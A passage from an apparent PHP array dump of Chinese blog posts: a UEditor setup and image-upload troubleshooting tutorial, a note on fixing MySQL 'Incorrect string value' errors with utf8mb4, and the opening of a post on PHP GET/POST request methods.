            'content' => '<p>因为本博客就是使用的百度ueditor编辑器，在使用过程中也是遇到了很多的问题，最终在我的不懈努力之下慢慢解决掉了。</p><p><span style=\\"font-size: 24px;\\"><strong>一、编辑器配置：</strong></span></p><h3>1.1 下载编辑器</h3><p>到官网下载 UEditor 最新版：<a href=\\"http://ueditor.baidu.com/website/download.html#ueditor\\" title=\\"官网下载地址\\">[官网地址]</a></p><h3>1.2 创建demo文件</h3><p>解压下载的包，在解压后的目录创建 demo.html 文件，填入下面的html代码</p><pre class=\\"brush:html;toolbar:false\\">&lt;!DOCTYPE&nbsp;HTML&gt;&lt;html&nbsp;lang=&quot;en-US&quot;&gt;&lt;head&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta&nbsp;charset=&quot;UTF-8&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;ueditor&nbsp;demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;!--&nbsp;加载编辑器的容器&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&nbsp;id=&quot;container&quot;&nbsp;name=&quot;content&quot;&nbsp;type=&quot;text/plain&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里写你的初始化内容
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/script&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;!--&nbsp;配置文件&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&nbsp;type=&quot;text/javascript&quot;&nbsp;src=&quot;ueditor.config.js&quot;&gt;&lt;/script&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;!--&nbsp;编辑器源码文件&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&nbsp;type=&quot;text/javascript&quot;&nbsp;src=&quot;ueditor.all.js&quot;&gt;&lt;/script&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;!--&nbsp;实例化编辑器&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&nbsp;type=&quot;text/javascript&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;ue&nbsp;=&nbsp;UE.getEditor(&#39;container&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</pre><h3>1.3 在浏览器打开demo.html</h3><p>如果看到了下面这样的编辑器，恭喜你，初次部署成功！</p><p><img src=\\"http://fex.baidu.com/ueditor/doc/images/demo.png\\" alt=\\"部署成功\\"/><br/></p><h3>1.4 传入自定义的参数</h3><p>编辑器有很多可自定义的参数项，在实例化的时候可以传入给编辑器：</p><pre style=\\"\\" class=\\"prettyprint lang-javascript prettyprinted\\">var&nbsp;ue&nbsp;=&nbsp;UE.getEditor(&#39;container&#39;,&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;autoHeight:&nbsp;false});</pre><p>配置项也可以通过 ueditor.config.js 文件修改，具体的配置方法请看<a class=\\"mardwodnlink\\" href=\\"http://fex.baidu.com/ueditor/#start-config\\">前端配置项说明</a></p><h3>1.5 设置和读取编辑器的内容</h3><p>通 getContent 和 setContent 方法可以设置和读取编辑器的内容</p><pre class=\\"brush:js;toolbar:false\\">var&nbsp;ue&nbsp;=&nbsp;UE.getContent();//对编辑器的操作最好在编辑器ready之后再做ue.ready(function()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;//设置编辑器的内容
&nbsp;&nbsp;&nbsp;&nbsp;ue.setContent(&#39;hello&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;//获取html内容，返回:&nbsp;&lt;p&gt;hello&lt;/p&gt;
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;html&nbsp;=&nbsp;ue.getContent();
&nbsp;&nbsp;&nbsp;&nbsp;//获取纯文本内容，返回:&nbsp;hello
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;txt&nbsp;=&nbsp;ue.getContentTxt();});</pre><p><strong><span style=\\"font-size: 24px;\\">三、编辑器配置图片上传</span></strong></p><p><span style=\\"font-size: 16px;\\"></span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;一、 在线编辑器在页面正常显示</p><p>&nbsp;&nbsp;&nbsp;&nbsp;1. 上百度Editor首页下载http://ueditor.baidu.com/website/</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2. COPY到自己的项目中去，然后记住ueditor所在文件的目录</p><p>&nbsp;&nbsp;&nbsp;&nbsp;3. 配置editor_config.js中的URL(<span style=\\"color: #ff0000;\\">这一步很重要</span>)<span style=\\"color: #000000;\\">，因为我在html文件中测试的时候是没有修改配置文件的信息也可以用，但是用在项目编辑器就无法显示</span></p><pre class=\\"brush:js;toolbar:false\\">/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;此处配置写法适用于UEditor小组成员开发使用，外部部署用户请按照上述说明方式配置即可，建议保留下面两行，以兼容可在具体每个页面配置window.UEDITOR_HOME_URL的功能。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;tmp&nbsp;=&nbsp;location.protocol.indexOf(&quot;file&quot;)==-1&nbsp;?&nbsp;location.pathname&nbsp;:&nbsp;location.href;
&nbsp;&nbsp;&nbsp;&nbsp;URL&nbsp;=&nbsp;window.UEDITOR_HOME_URL||tmp.substr(0,tmp.lastIndexOf(&quot;\\\\/&quot;)+1).replace(&quot;_examples/&quot;,&quot;&quot;).replace(&quot;website/&quot;,&quot;&quot;);//这里你可以配置成ueditor目录在您网站的相对路径或者绝对路径（指以http开头的绝对路径）</pre><pre class=\\"brush:js;toolbar:false\\">/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;配置项主体。注意，此处所有涉及到路径的配置别遗漏URL变量。
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;window.UEDITOR_CONFIG&nbsp;=&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//为编辑器实例添加一个路径，这个不能被注释
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UEDITOR_HOME_URL&nbsp;:&nbsp;URL

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//图片上传配置区
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,imageUrl:URL+&quot;jsp/imageUp.jsp&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//图片上传提交地址
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,imagePath:URL&nbsp;+&nbsp;&quot;jsp/&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//图片修正地址，引用了fixedImagePath,如有特殊需求，可自行配置</pre><p>图片上传路径配置区域是在：ueditor.config.js里URL路径是直接指向了ueditor所在项目中的位置。如：/tools/editor/</p><pre class=\\"brush:html;toolbar:false\\">&lt;!DOCTYPE&nbsp;HTML&gt;
&lt;html&gt;
&lt;head&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;完整的demo&lt;/title&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta&nbsp;http-equiv=&quot;Content-Type&quot;&nbsp;content=&quot;text/html;charset=gbk&quot;/&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;UEDITOR_HOME_URL&nbsp;=&nbsp;&quot;/ueditor/&quot;;　　//从项目的根目录开始
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/script&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;link&nbsp;type=&quot;text/css&quot;&nbsp;href=&quot;./themes/default/css/ueditor.css&quot;&nbsp;rel=&quot;stylesheet&quot;/&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&nbsp;type=&quot;text/javascript&quot;&nbsp;src=&quot;./editor_config.js&quot;&gt;&lt;/script&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&nbsp;type=&quot;text/javascript&quot;&nbsp;src=&quot;./editor_all.js&quot;&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&nbsp;&nbsp;id=&quot;myEditor&quot;&nbsp;type=&quot;text/plain&quot;&gt;欢迎使用&lt;/script&gt;
&lt;/div&gt;
&lt;script&nbsp;type=&quot;text/javascript&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;//初始化
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;ue&nbsp;=&nbsp;UE.getEditor(&#39;myEditor&#39;);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre><p>原因是window.UEDITOR_HOME_URL没有定义，只要在引入script脚本前声明并复制就可以正常使用了，见下代码：</p><p><strong><span style=\\"font-size: 24px;\\"></span></strong></p><p>还有一点就是，如果没有引入editor.css文件那么部分功能的显示将会没有那么好看。(废话。。。)</p><p>二、 图片上传</p><p>1. 具体包括imageUp.jsp和Uploader.java这两个文件</p><p>2. 在jsp页面中只需要引入正确Uploader.java所在的包就行。</p><p>3. 剩下的工作就是在Uploader.java中修改图片上传的目录、制定文件名生成规则等等。 做实现过程中让我很纠结的是：配置完成没问题了，但是就是图片上传不成功具体错误如下：</p><p>&nbsp; &nbsp; &nbsp; 3.1 在没有找到Uploader类的情况下就会报：网络设置不正确，上传失败(大概就是这个意思。。。)</p><p>　　3.2 所有的工作都做完的情况下，上传图片就是不成功，捕获异常呢也捕获不到，最后设置断点之后才知道<span style=\\"color: #000000;\\">fii.hasNext()返回为false，根本原因就是：</span></p><p><span style=\\"color: #ff0000;\\">因为我用的是S2SH框架，在web.xml中struts2过滤器中把*.jsp去掉，如下代码应该去掉，那就OK了：</span></p><p><span style=\\"color: #ff0000;\\"></span></p><pre>&lt;filter-mapping&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;filter-name&gt;struts2&lt;/filter-name&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;
&lt;/filter-mapping&gt;</pre><pre class=\\"brush:js;toolbar:false\\">public&nbsp;void&nbsp;upload()&nbsp;throws&nbsp;Exception{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;boolean&nbsp;isMultipart&nbsp;=&nbsp;ServletFileUpload.isMultipartContent(this.request);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!isMultipart)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.state&nbsp;=&nbsp;this.errorInfo.get(&quot;NOFILE&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DiskFileItemFactory&nbsp;dff&nbsp;=&nbsp;new&nbsp;DiskFileItemFactory();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;savePath&nbsp;=&nbsp;this.getFolder(this.savePath);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dff.setRepository(new&nbsp;File(savePath));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ServletFileUpload&nbsp;sfu&nbsp;=&nbsp;new&nbsp;ServletFileUpload(dff);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sfu.setSizeMax(this.maxSize&nbsp;*&nbsp;1024);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sfu.setHeaderEncoding(&quot;gbk&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileItemIterator&nbsp;fii&nbsp;=&nbsp;sfu.getItemIterator(this.request);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(fii.hasNext())&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileItemStream&nbsp;fis&nbsp;=&nbsp;fii.next();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!fis.isFormField())&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.originalName&nbsp;=&nbsp;fis.getName().substring(fis.getName().lastIndexOf(System.getProperty(&quot;file.separator&quot;))&nbsp;+&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!this.checkFileType(this.originalName))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.state&nbsp;=&nbsp;this.errorInfo.get(&quot;TYPE&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.fileName&nbsp;=&nbsp;this.getName(this.originalName);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.type&nbsp;=&nbsp;this.getFileExt(this.fileName);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.url&nbsp;=&nbsp;savePath&nbsp;+&nbsp;&quot;/&quot;&nbsp;+&nbsp;this.fileName;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BufferedInputStream&nbsp;in&nbsp;=&nbsp;new&nbsp;BufferedInputStream(fis.openStream());
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileOutputStream&nbsp;out&nbsp;=&nbsp;new&nbsp;FileOutputStream(new&nbsp;File(this.getPhysicalPath(this.url)));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BufferedOutputStream&nbsp;output&nbsp;=&nbsp;new&nbsp;BufferedOutputStream(out);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Streams.copy(in,&nbsp;output,&nbsp;true);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.state=this.errorInfo.get(&quot;SUCCESS&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//UE中只会处理单张上传，完成后即退出
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;fname&nbsp;=&nbsp;fis.getFieldName();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//只处理title，其余表单请自行处理
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!fname.equals(&quot;pictitle&quot;)){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BufferedInputStream&nbsp;in&nbsp;=&nbsp;new&nbsp;BufferedInputStream(fis.openStream());
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BufferedReader&nbsp;reader&nbsp;=&nbsp;new&nbsp;BufferedReader(new&nbsp;InputStreamReader(in));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StringBuffer&nbsp;result&nbsp;=&nbsp;new&nbsp;StringBuffer();&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(reader.ready())&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result.append((char)reader.read());&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.title&nbsp;=&nbsp;new&nbsp;String(result.toString().getBytes(),&quot;gbk&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reader.close();&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;catch&nbsp;(Exception&nbsp;e)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.state&nbsp;=&nbsp;this.errorInfo.get(&quot;UNKNOWN&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p><strong><span style=\\"font-size: 24px;\\">四、实现编辑器自适应宽度的解决方案</span></strong></p><p><span style=\\"font-size: 24px;\\"></span></p><p>由于我的网站后台是自适应的，但我们在使用时会发现编辑器不能自适应宽度了，下文我们就一起来看问题解决办法．</p><p>UEditor百度富文本编辑器的initialFrameWidth属性,默认值是1000.</p><p>不能够自适应屏幕宽度.如图1:</p><p><img class=\\"\\" alt=\\"UEditor编辑器实现编辑器自适应宽度的解决方案\\" src=\\"http://filesimg.111cn.net/upload/image/20150201044317.jpg\\"/></p><p>刚开始的时候,我是直接设置initialFrameWidth=null的.效果如图2:</p><p><img class=\\"\\" alt=\\"UEditor编辑器实现编辑器自适应宽度的解决方案\\" src=\\"http://filesimg.111cn.net/upload/image/20150201044334.jpg\\"/></p><p>&nbsp;</p><p>这样子UEditor百度富文本编辑器会在第一次加载的时候获取屏幕宽度,然后赋值给initialFrameWidth属性.<br/>这样子确实是可以在第一次加载的时候适应屏幕宽度,但是却似乎宽度稍微过了一点点,超过上面的灰条了.而且这里还有一个问题:<br/>当你改变浏览器大小时,会有个很严重的排版BUG.<br/>由于它不会自适应宽度.所以会发现编辑器宽度溢出.如图3:</p><p><img class=\\"\\" alt=\\"UEditor编辑器实现编辑器自适应宽度的解决方案\\" src=\\"http://filesimg.111cn.net/upload/image/20150201044354.jpg\\"/></p><p><br/>解决方案:</p><p><br/>1.打开/ueditor/ueditor.config.js<br/>找到initialFrameWidth属性,默认值是1000.即是initialFrameWidth: 1000<br/>把值更改为&#39;100%&#39; , 即是initialFrameWidth: &#39;100%&#39;<br/>保存后,刷新浏览器再看看...</p><p><br/>效果如图4:<img class=\\"\\" alt=\\"UEditor编辑器实现编辑器自适应宽度的解决方案\\" src=\\"http://filesimg.111cn.net/upload/image/20150201044410.jpg\\"/></p><p><span style=\\"font-size: 24px;\\"><strong>五、百度编辑器ueditor 如何用JS取得内容</strong></span></p><p>调用百度编辑器后，用JS怎么取得内容呢？百度的帮助文档写的好隐晦……</p><p>我知道提交表单后，$_POST[&#39;editorValue&#39;];是可以获取内容的，但是JS中怎么做呢？我想用AJAX无刷新技术，所以问一下JS怎么获取内容。</p><pre class=\\"brush:html;toolbar:false\\">&lt;div&nbsp;id=&quot;myEditor&quot;&gt;
&lt;script&nbsp;type=&quot;text/javascript&quot;&nbsp;id=&quot;myEditor&quot;&gt;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;editor&nbsp;=&nbsp;new&nbsp;baidu.editor.ui.Editor({&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;initialContent:&nbsp;&#39;&#39;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;editor.render(&quot;myEditor&quot;);&nbsp;
&lt;/script&gt;&nbsp;
&lt;/div&gt;</pre><p><br/></p>',
            'keyword' => 'ueditor,百度,编辑器',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 17:09:39',
          ),
          10 => 
          array (
            'id' => '75',
            'uid' => '1',
            'title' => '异常处理：使用UTF-8编码Mysql仍然抛出Incorrect string value异常',
            'content' => '<p style=\\"margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; font-family:Arial; font-size:14px; line-height:26px\\">在写这个博客的时候遇到了一个问题，就是插入数据，有的时候会报错，数据库用的是uft8，数据表也是，字段也是，但是原因为什么呢？</p><p style=\\"margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; font-family:Arial; font-size:14px; line-height:26px\\">网上多方查找发现，有些字符会得到4字节的utf8编码，所以在插入数据时会抛出异常：</p><p style=\\"margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; font-family:Arial; font-size:14px; line-height:26px\\">Incorrect string value: &#39;\\\\xF0\\\\x90\\\\x8D\\\\x83\\\\xF0\\\\x90...&#39;&nbsp;<br/></p><br/><p style=\\"margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; font-family:Arial; font-size:14px; line-height:26px\\">原来问题出在mysql上，mysql如果设置编码集为utf8那么它最多只能支持到3个字节的UTF-8编码，而4个字节的UTF-8字符还是存在的，这样一来如果你建表的时候用的utf8字符集出异常就理所当然了。</p><p style=\\"margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; font-family:Arial; font-size:14px; line-height:26px\\"><br/></p><p style=\\"margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; font-family:Arial; font-size:14px; line-height:26px\\">解决方法很简单，修改字段或者表的字符集为utf8mb4。</p><p style=\\"margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; font-family:Arial; font-size:14px; line-height:26px\\"><br/></p><p style=\\"margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; font-family:Arial; font-size:14px; line-height:26px\\">比较蛋疼的是，字符集utf8mb4在mysql 5.5.3之后才支持</p><p><br/></p>',
            'keyword' => '异常,UTF-8,编码,Mysql,Incorrect string value',
            'sortid' => '4',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:55:08',
          ),
          11 => 
          array (
            'id' => '74',
            'uid' => '1',
            'title' => 'php发送get、post请求获取内容的几种方法',
            'content' => '<pre class=\\"brush:php;toolbar:false\\">方法1:&nbsp;用file_get_contents&nbsp;以get方式获取内容
&nbsp;&nbsp;
&lt;?php
$url=&#39;http://www.domain.com/&#39;;
$html&nbsp;=&nbsp;file_get_contents($url);
echo&nbsp;$html;
?&gt;

方法2:&nbsp;用fopen打开url,&nbsp;以get方式获取内容

&nbsp;&nbsp;&nbsp;&nbsp;
&lt;?php&nbsp;&nbsp;
